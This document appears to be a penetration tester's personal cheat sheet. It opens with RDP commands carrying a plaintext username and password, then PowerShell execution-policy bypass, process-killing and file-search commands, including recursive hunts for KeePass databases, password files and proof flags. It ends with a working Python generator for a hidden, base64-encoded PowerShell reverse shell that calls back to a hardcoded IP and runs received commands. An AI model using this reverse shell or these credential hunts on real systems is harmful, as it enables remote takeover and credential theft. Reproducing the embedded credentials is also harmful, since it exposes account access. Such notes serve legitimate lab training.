## Quick Notes

## Links

- [CyberChef](https://gchq.github.io/CyberChef/)
### Random things 

### Remote Desktop Specific

```
xfreerdp /cert-ignore /compression /auto-reconnect /u:dmzadmin /p:SlimGodhoodMope /v:192.168.188.191 /w:1600 /h:800 

rdesktop -z -P -x m -u dmzadmin -p SlimGodhoodMope 192.168.188.191 -r 

```

### Powershell Bypass Policy
```
Do this to run powershell:
powershell -ExecutionPolicy Bypass -File GetCLSID.ps1
```
### Kill a Process
```

To kill a port process on windows:

netstat -ano | findstr :<PORT>
taskkill /PID <PID> /F

To kill a port process on Kali:

sudo fuser -k 81/udp
```

### Find Things
```

To find things:

locate something
find / -name exact_name>/dev/null

To search for text within files:
grep mail /etc/passwd


On Windows:

Get-ChildItem -Path C:\ -Include *.kdbx* -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *proof.txt* -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *password* -File -Recurse -ErrorAction SilentlyContinue

FINDSTR /i /r /c:"hello.*goodbye" /c:"goodbye.*hello" Demo.txt

```


### Fix Kali Copy Paste Issue
```
Kali VM Fix Copy/Paste:

1. `sudo apt-get autoremove open-vm-tools`
2. Install VMware Tools by following the usual method (`Virtual Machine --> Reinstall VMWare Tools`)
3. Reboot the VM
4. `sudo apt-get install open-vm-tools-desktop`
5. Reboot the VM, after the reboot copy/paste and drag/drop will work!



Quick Python Powershell Reverse Shell generator
---

import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.164",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)

```